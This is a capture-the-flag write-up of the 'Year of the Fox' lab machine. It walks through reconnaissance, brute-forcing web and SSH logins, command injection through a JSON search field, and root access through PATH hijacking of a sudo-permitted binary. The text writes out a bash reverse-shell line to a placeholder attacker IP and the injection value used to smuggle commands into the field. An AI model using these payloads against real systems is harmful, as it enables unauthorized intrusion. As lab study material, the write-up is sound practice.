## ENUMERATION
Starting with an nmap scan as always:
```
PORT      STATE    SERVICE     VERSION
80/tcp    open     http        Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
2725/tcp  filtered msolap-ptp2
49159/tcp filtered unknown
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
| smb2-time: 
|   date: 2023-07-11T10:56:50
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: mean: -19m57s, deviation: 34m39s, median: 2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-07-11T11:56:49+01:00
```
Taking a look at the webserver first:
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194100.png)

We don't have any credentials to work with for now so let's move on to Samba.

## SAMBA
Use enum4linux to enumerate SMB shares:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20193807.png)

We got 2 users :
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20193917.png)

You can try to bruteforce smb using user fox but its time consuming.
## ACTIVE ENUMERATION
Use hydra to bruteforce web login. It works with user rascal but the password changes everytime we restart the machine.
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194218.png)

The website:
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20160130.png)

Search an empty string and you can see the expected input is files. Also , seems like it doesn't like some characters.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20160520.png)

Intercepting request with Burp:
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20163302.png)

Now , I used intruder to launch a simple SQL injection fuzzing but got nothing. So now onto command injection. You can run some commands using : `{"target":"\"; COMMAND \""}`
Used RCE Command : `bash -i >& /dev/tcp/YOUR-IP/PORT 0>&1` but got invalid-character response so used base 64.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194847.png)

Use burp repeater:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20194710.png)

We gain an RCE:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195039.png)

And there we get our first flag!
## FOOTHOLD
Check all processes which are running:

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195224.png)

There seems to be SSH running on port 22 and can be confirmed in `/etc/ssh/sshd_config` file which also tells us that only user fox can use it. We can use this.
Use socat as a TCP port forwarder. Here socat listens on port 2222 , accepts connections and forwards connections to port 22 on remote host.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195606.png)

We've established a connection. Now time to bruteforce :

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195736.png)

Sweet! Now SSH as User fox :

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-10%20195918.png)

And there we have our second flag!
Now see all the commands user fox can run : `sudo -l`

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-11%20165345.png)

We can run shutdown as root without password. GTFObins doesn't give anything. Dragging the file onto our machine so we can analyze it.
Use Radare2 :
```
r2 -AAAA /tmp/shutdown
pdg
```
And looks like this binary is calling the `poweroff` binary which doesn't seem to be using an absolute path. So, we can use PATH manipulation to spawn a root shell. Here we are copying /bin/bash to our own version of `/tmp/poweroff` and adding that to `$PATH `so that when it searches for the poweroff binary it searches the /tmp directory first.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-11%20165659.png)

And there we have our root shell.

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-11%20165746.png)
![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-11%20170230.png)

Also found this :

![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20fox/images/Screenshot%202023-07-11%20170314.png)
